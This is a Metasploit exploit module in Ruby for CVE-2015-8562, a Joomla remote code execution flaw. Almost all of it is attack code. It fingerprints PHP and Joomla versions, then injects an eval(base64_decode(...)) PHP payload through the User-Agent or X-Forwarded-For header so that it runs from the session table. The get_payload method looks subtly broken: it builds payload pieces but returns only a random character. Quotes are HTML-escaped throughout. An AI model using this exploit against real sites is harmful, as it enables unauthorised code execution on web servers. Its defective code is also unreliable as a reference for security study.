# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Joomla HTTP Header Unauthenticated Remote Code Execution&#039;,
      &#039;Description&#039;    => %q{
          Joomla suffers from an unauthenticated remote code execution that affects all versions from 1.5.0 to 3.4.5.
          By storing user supplied headers in the databases session table it&#039;s possible to truncate the input
          by sending an UTF-8 character. The custom created payload is then executed once the session is read
          from the databse. You also need to have a PHP version before 5.4.45 (including 5.3.x), 5.5.29 or 5.6.13.
          In later versions the deserialisation of invalid session data stops on the first error and the
          exploit will not work. The PHP Patch was included in Ubuntu versions 5.5.9+dfsg-1ubuntu4.13 and
          5.3.10-1ubuntu3.20 and in Debian in version 5.4.45-0+deb7u1.
      },
      &#039;Author&#039;  =>
        [
          &#039;Marc-Alexandre Montpas&#039;, # discovery
          &#039;Christian Mehlmauer&#039; # metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2015-8562&#039;],
          [&#039;URL&#039;, &#039;https://blog.sucuri.net/2015/12/joomla-remote-code-execution-the-details.html&#039;],
          [&#039;URL&#039;, &#039;https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html&#039;],
          [&#039;URL&#039;, &#039;https://developer.joomla.org/security-centre/630-20151214-core-remote-code-execution-vulnerability.html&#039;],
          [&#039;URL&#039;, &#039;https://translate.google.com/translate?hl=en&sl=auto&tl=en&u=http%3A%2F%2Fdrops.wooyun.org%2Fpapers%2F11330&#039;],
          [&#039;URL&#039;, &#039;https://translate.google.com/translate?hl=en&sl=auto&tl=en&u=http%3A%2F%2Fwww.freebuf.com%2Fvuls%2F89754.html&#039;],
          [&#039;URL&#039;, &#039;https://bugs.php.net/bug.php?id=70219&#039;]
        ],
      &#039;Privileged&#039;     => false,
      &#039;Platform&#039;       => &#039;php&#039;,
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        => [[&#039;Joomla 1.5.0 - 3.4.5&#039;, {}]],
      &#039;DisclosureDate&#039; => &#039;Dec 14 2015&#039;,
      &#039;DefaultTarget&#039;  => 0)
    )

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [ true,  &#039;The path to joomla&#039;, &#039;/&#039; ]),
        OptEnum.new(&#039;HEADER&#039;, [ true,  &#039;The header to use for exploitation&#039;, &#039;USER-AGENT&#039;, [ &#039;USER-AGENT&#039;, &#039;X-FORWARDED-FOR&#039; ]])
      ], self.class)

    register_advanced_options(
      [
        OptBool.new(&#039;FORCE&#039;, [true, &#039;Force run even if check reports the service is safe.&#039;, false]),
      ], self.class)
  end

  def check
    res = send_request_cgi({&#039;uri&#039; => target_uri.path })

    unless res
      vprint_error("Connection timed out")
      return Exploit::CheckCode::Unknown
    end

    unless res.headers[&#039;X-Powered-By&#039;]
      vprint_error("Unable to determine the PHP version.")
      return Exploit::CheckCode::Unknown
    end

    php_version, rest = res.headers[&#039;X-Powered-By&#039;].scan(/PHP\/([\d\.]+)(?:-(.+))?/i).flatten || &#039;&#039;
    version = Gem::Version.new(php_version)
    vulnerable = false

    # check for ubuntu and debian specific versions. Was fixed in
    # * 5.5.9+dfsg-1ubuntu4.13
    # * 5.3.10-1ubuntu3.20
    # * 5.4.45-0+deb7u1
    # Changelogs (search for CVE-2015-6835 or #70219):
    #   http://changelogs.ubuntu.com/changelogs/pool/main/p/php5/php5_5.5.9+dfsg-1ubuntu4.13/changelog
    #   http://changelogs.ubuntu.com/changelogs/pool/main/p/php5/php5_5.3.10-1ubuntu3.20/changelog
    #   http://metadata.ftp-master.debian.org/changelogs/main/p/php5/php5_5.4.45-0+deb7u2_changelog
    if rest && rest.include?(&#039;ubuntu&#039;)
      sub_version = rest.scan(/^\dubuntu([\d\.]+)/i).flatten.first || &#039;&#039;
      vprint_status("Found Ubuntu PHP version #{res.headers[&#039;X-Powered-By&#039;]}")

      if version > Gem::Version.new(&#039;5.5.9&#039;)
        vulnerable = false
      elsif version == Gem::Version.new(&#039;5.5.9&#039;) && Gem::Version.new(sub_version) >= Gem::Version.new(&#039;4.13&#039;)
        vulnerable = false
      elsif version == Gem::Version.new(&#039;5.3.10&#039;) && Gem::Version.new(sub_version) >= Gem::Version.new(&#039;3.20&#039;)
        vulnerable = false
      else
        vulnerable = true
      end
    elsif rest && rest.include?(&#039;+deb&#039;)
      sub_version = rest.scan(/^\d+\+deb([\du]+)/i).flatten.first || &#039;&#039;
      vprint_status("Found Debian PHP version #{res.headers[&#039;X-Powered-By&#039;]}")

      if version > Gem::Version.new(&#039;5.4.45&#039;)
        vulnerable = false
      elsif version == Gem::Version.new(&#039;5.4.45&#039;) && sub_version != &#039;7u1&#039;
        vulnerable = false
      else
        vulnerable = true
      end
    else
      vprint_status("Found PHP version #{res.headers[&#039;X-Powered-By&#039;]}")
      vulnerable = true if version <= Gem::Version.new(&#039;5.4.44&#039;)
      vulnerable = true if version.between?(Gem::Version.new(&#039;5.5.0&#039;), Gem::Version.new(&#039;5.5.28&#039;))
      vulnerable = true if version.between?(Gem::Version.new(&#039;5.6.0&#039;), Gem::Version.new(&#039;5.6.12&#039;))
    end

    unless vulnerable
      vprint_error(&#039;This module currently does not work against this PHP version&#039;)
      return Exploit::CheckCode::Safe
    end

    res = send_request_cgi({&#039;uri&#039; => normalize_uri(target_uri.path, &#039;administrator&#039;, &#039;manifests&#039;, &#039;files&#039;, &#039;joomla.xml&#039;) })
    if res && res.code == 200 && res.body && res.body.include?(&#039;<author>Joomla! Project</author>&#039;)
      joomla_version = res.body.scan(/<version>([\d\.]+)<\/version>/i).flatten.first || &#039;&#039;
      unless joomla_version.empty?
        vprint_status("Detected Joomla version #{joomla_version}")
        return Exploit::CheckCode::Appears if Gem::Version.new(joomla_version) < Gem::Version.new(&#039;3.4.6&#039;)
      end
    end

    res.get_html_meta_elements.each do |element|
      if element.attributes[&#039;name&#039;] &&
        /^generator$/i === element.attributes[&#039;name&#039;] &&
        element.attributes[&#039;content&#039;] &&
        /joomla/i === element.attributes[&#039;content&#039;].value
        return Exploit::CheckCode::Detected
      end
    end

    Exploit::CheckCode::Safe
  end

  # gets a random 4 byte UTF-8 character
  def get_terminator
    # valid codepoints for 4byte UTF-8 chars: U+010000 - U+10FFFF
    [rand(0x10000..0x10ffff)].pack(&#039;U*&#039;)
  end

  def get_payload(header_name)
    pay = "eval(base64_decode($_SERVER[&#039;HTTP_#{header_name}&#039;]));JFactory::getConfig();exit;"
    post_pay = &#039;";}i:1;s:4:"init";}}s:13:"\0\0\0connection";i:1;}&#039;
    t1000 = get_terminator
  end

  def print_status(msg=&#039;&#039;)
    super("#{peer} - #{msg}")
  end

  def print_error(msg=&#039;&#039;)
    super("#{peer} - #{msg}")
  end

  def exploit
    if check == Exploit::CheckCode::Safe && datastore[&#039;FORCE&#039;] == false
      print_error(&#039;Target seems safe, so we will not continue.&#039;)
      return
    end

    print_status("Sending payload ...")
    header_name = Rex::Text.rand_text_alpha_upper(5)
    res = send_request_cgi({
      &#039;method&#039;  => &#039;GET&#039;,
      &#039;uri&#039;     => target_uri.path,
      &#039;headers&#039; => { datastore[&#039;HEADER&#039;] => get_payload(header_name) }
    })
    fail_with(Failure::Unknown, &#039;No response&#039;) if res.nil?
    session_cookie = res.get_cookies
    send_request_cgi({
      &#039;method&#039;  => &#039;GET&#039;,
      &#039;uri&#039;     => target_uri.path,
      &#039;cookie&#039;  => session_cookie,
      &#039;headers&#039; => {
        header_name => Rex::Text.encode_base64(payload.encoded)
      }
    })
  end
end

